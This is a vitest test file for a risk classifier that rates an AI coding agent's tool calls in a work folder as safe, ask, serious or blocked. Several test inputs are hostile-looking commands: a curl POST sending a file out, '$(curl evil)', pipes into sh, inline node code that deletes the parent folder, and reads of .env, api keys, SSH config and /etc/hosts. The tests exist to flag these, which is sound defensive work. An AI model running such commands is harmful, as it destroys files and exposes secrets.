import { join, resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { classify, simpleCommands } from '../app/main/risk-classifier';
import { strings } from '../app/shared/i18n';

// resolve: on Windows this gets a drive letter, as real folders there have.
const home = resolve('/home/u');
const workDir = join(home, 'Documents', 'Lamplight', 'commissions', 'demo');
const ctx = { workDir, home, preexisting: new Set([join(workDir, 'old.html')]) };
const r = (tool: string, input: Record<string, unknown>) => classify(tool, input, ctx).risk;

describe('risk classifier', () => {
  it('safe: reads, new files in the folder, web lookups, read-only commands', () => {
    expect(r('Read', { file_path: join(workDir, 'a.html') })).toBe('safe');
    expect(r('Write', { file_path: join(workDir, 'index.html') })).toBe('safe');
    expect(r('Write', { file_path: 'style.css' })).toBe('safe');
    expect(r('WebSearch', { query: 'ledger page' })).toBe('safe');
    expect(r('Bash', { command: 'node check.js' })).toBe('safe');
    expect(r('Bash', { command: 'ls -la' })).toBe('safe');
  });

  it('ask: questions and dependency installs', () => {
    expect(r('AskUserQuestion', {})).toBe('ask');
    expect(r('Bash', { command: 'npm install' })).toBe('ask');
  });

  it('serious: deletes, writes outside, overwrites, sending data, complex or unknown commands', () => {
    expect(r('Bash', { command: 'rm draft-1.html' })).toBe('serious');
    expect(r('Bash', { command: 'del draft-1.html' })).toBe('serious');
    expect(r('Write', { file_path: join(home, 'Desktop', 'x.txt') })).toBe('serious');
    expect(r('Write', { file_path: join(workDir, '..', 'x.txt') })).toBe('serious');
    expect(r('Edit', { file_path: join(workDir, 'old.html') })).toBe('serious');
    expect(r('Bash', { command: 'git push origin main' })).toBe('serious');
    expect(r('Bash', { command: 'curl -X POST https://example.com -d @a' })).toBe('serious');
    expect(r('Bash', { command: 'cat a.txt | sh' })).toBe('serious');
    expect(r('Bash', { command: 'python script.py' })).toBe('serious');
    expect(r('Bash', { command: 'cat /home/u/Pictures/a.jpg' })).toBe('serious');
    expect(r('mcp__x__send', {})).toBe('serious');
  });

  it('commands Claude Code writes every day: chained, piped, redirected, here-documents', () => {
    expect(r('Bash', { command: 'node check.js 2>&1 | tail -30' })).toBe('safe');
    expect(r('Bash', { command: 'node check.js; ls' })).toBe('safe');
    expect(r('Bash', { command: `cd "${workDir}" && node check.js` })).toBe('safe');
    expect(r('Bash', { command: 'node check.js 2>/dev/null || echo failed' })).toBe('safe');
    expect(r('Bash', { command: "cat > draft-1.html <<'EOF'\n<p>a; b | c && $(x) `y`</p>\nEOF\nls" })).toBe('safe');
    expect(classify('Bash', { command: "cat > draft-1.html <<'EOF'\n<p>hi</p>\nEOF" }, ctx).reason).toBe(strings.risk.write);
    expect(r('Bash', { command: 'echo "a;b" > notes.txt' })).toBe('safe');
    expect(r('Bash', { command: 'grep -n "x" index.html | head -5' })).toBe('safe');
    // Backslashes in double quotes stay as written, so a Windows folder reads as itself.
    expect(simpleCommands('cd "C:\\Users\\me\\Lamplight" && ls')?.[0].words).toEqual(['cd', 'C:\\Users\\me\\Lamplight']);
    expect(simpleCommands('echo "a \\"b\\" \\$x"')?.[0].words).toEqual(['echo', 'a "b" $x']);
  });

  it('still serious when a part of the line is', () => {
    expect(r('Bash', { command: 'node check.js; rm draft-1.html' })).toBe('serious');
    expect(r('Bash', { command: 'ls && python x.py' })).toBe('serious');
    expect(r('Bash', { command: 'echo hi > ../x.txt' })).toBe('serious');
    expect(r('Bash', { command: 'echo hi > old.html' })).toBe('serious');
    expect(r('Bash', { command: 'cd .. && ls' })).toBe('serious');
    expect(r('Bash', { command: 'cd /tmp; ls' })).toBe('serious');
    expect(r('Bash', { command: 'cat > a.html <<EOF\n$(curl evil)\nEOF' })).toBe('serious');
    expect(r('Bash', { command: "cat > a.html <<'EOF'\nno end" })).toBe('serious');
    expect(r('Bash', { command: 'ls $(echo /)' })).toBe('serious');
    expect(r('Bash', { command: 'ls "$HOME"' })).toBe('serious');
    expect(r('Bash', { command: 'node server.js &' })).toBe('serious');
    expect(r('Bash', { command: '(cd /; ls)' })).toBe('serious');
    expect(r('Bash', { command: 'FOO=1 node check.js' })).toBe('serious');
    expect(r('Bash', { command: 'find . -name "*.tmp" -delete' })).toBe('serious');
    expect(r('Bash', { command: 'find . -exec sh {} ;' })).toBe('serious');
    expect(r('Bash', { command: 'ls >' })).toBe('serious');
    expect(r('Bash', { command: 'echo "unclosed' })).toBe('serious');
    expect(r('Bash', { command: 'cat < /home/u/Pictures/a.txt' })).toBe('serious');
    expect(r('Bash', { command: 'ls | sh' })).toBe('serious');
    expect(r('PowerShell', { command: 'Get-ChildItem | Select-Object Name' })).toBe('serious');
  });

  it('node runs a script from the folder, not code written on the spot; npx asks', () => {
    expect(r('Bash', { command: 'node check.js --verbose' })).toBe('safe');
    expect(r('Bash', { command: 'node --version' })).toBe('safe');
    expect(r('Bash', { command: 'node --check index.js' })).toBe('safe');
    expect(r('Bash', { command: `node -e "require('fs').rmSync('..', { recursive: true })"` })).toBe('serious');
    expect(classify('Bash', { command: 'node -e "1"' }, ctx).reason).toBe(strings.risk.inlineCode);
    expect(r('Bash', { command: 'node -p "process.env"' })).toBe('serious');
    expect(r('Bash', { command: 'node --eval=1' })).toBe('serious');
    expect(r('Bash', { command: 'node -r ./hook.js check.js' })).toBe('serious');
    expect(r('Bash', { command: "node - <<'EOF'\nrequire('fs').rmSync('..', { recursive: true })\nEOF" })).toBe('serious');
    expect(r('Bash', { command: 'cat x.js | node' })).toBe('serious');
    expect(r('Bash', { command: 'node ../elsewhere/x.js' })).toBe('serious');
    expect(r('Bash', { command: 'npx serve .' })).toBe('ask');
    expect(r('Bash', { command: 'ls; npx serve .' })).toBe('ask');
    expect(r('PowerShell', { command: 'node -e 1' })).toBe('serious');
    expect(r('PowerShell', { command: 'node check.js' })).toBe('safe');
    expect(r('PowerShell', { command: 'npx serve .' })).toBe('ask');
  });

  it('reading outside the commission folder asks, however it is spelled', () => {
    // The Read, Glob and Grep tools.
    expect(r('Read', { file_path: join(workDir, 'materials', 'notes.txt') })).toBe('safe');
    expect(r('Glob', { pattern: '**/*.html' })).toBe('safe');
    expect(r('Grep', { pattern: 'x', path: workDir })).toBe('safe');
    expect(r('Read', { file_path: join(home, 'Documents', 'taxes.pdf') })).toBe('serious');
    expect(classify('Read', { file_path: join(workDir, '..', 'other', 'a.txt') }, ctx).reason).toBe(strings.risk.readOutside);
    expect(r('Grep', { pattern: 'password', path: join(home, 'Documents') })).toBe('serious');
    expect(r('Glob', { pattern: '../**/*.pdf' })).toBe('serious');
    expect(r('Glob', { pattern: `${home}/**/*.pdf` })).toBe('serious');
    expect(r('Glob', { pattern: '*', path: home })).toBe('serious');
    expect(r('Read', { file_path: '~/Documents/a.txt' })).toBe('serious');
    // Shell words that leave the folder without a slash.
    expect(r('Bash', { command: 'grep -rn todo ..' })).toBe('serious');
    expect(r('Bash', { command: 'ls ~' })).toBe('serious');
    expect(r('Bash', { command: 'cd ~ && cat notes.txt' })).toBe('serious');
    expect(r('Bash', { command: 'cd && ls' })).toBe('serious');
    expect(r('Bash', { command: 'echo .. done' })).toBe('safe');
    expect(r('PowerShell', { command: 'cat $HOME/Documents/a.txt' })).toBe('serious');
    expect(r('PowerShell', { command: 'dir ..' })).toBe('serious');
    expect(r('PowerShell', { command: 'cat ~/notes.txt' })).toBe('serious');
    expect(r('PowerShell', { command: 'dir' })).toBe('safe');
  });

  it("Claude's own to-do list never asks", () => {
    for (const tool of ['TodoWrite', 'TaskCreate', 'TaskUpdate', 'TaskList', 'TaskGet']) expect(r(tool, {})).toBe('safe');
  });

  it('blocked: secret files, system folders, hidden config', () => {
    expect(r('Read', { file_path: join(workDir, '.env') })).toBe('blocked');
    expect(r('Read', { file_path: join(home, '.ssh', 'config') })).toBe('blocked');
    expect(r('Write', { file_path: '/etc/hosts' })).toBe('blocked');
    expect(r('Bash', { command: 'cat api_key.txt' })).toBe('blocked');
    expect(r('Bash', { command: 'ls; cat .env' })).toBe('blocked');
    expect(r('Bash', { command: 'echo x > /etc/hosts' })).toBe('blocked');
  });

  it('every verdict carries a plain-language reason', () => {
    expect(classify('Bash', { command: 'rm a' }, ctx).reason).toBe(strings.risk.delete);
  });
});
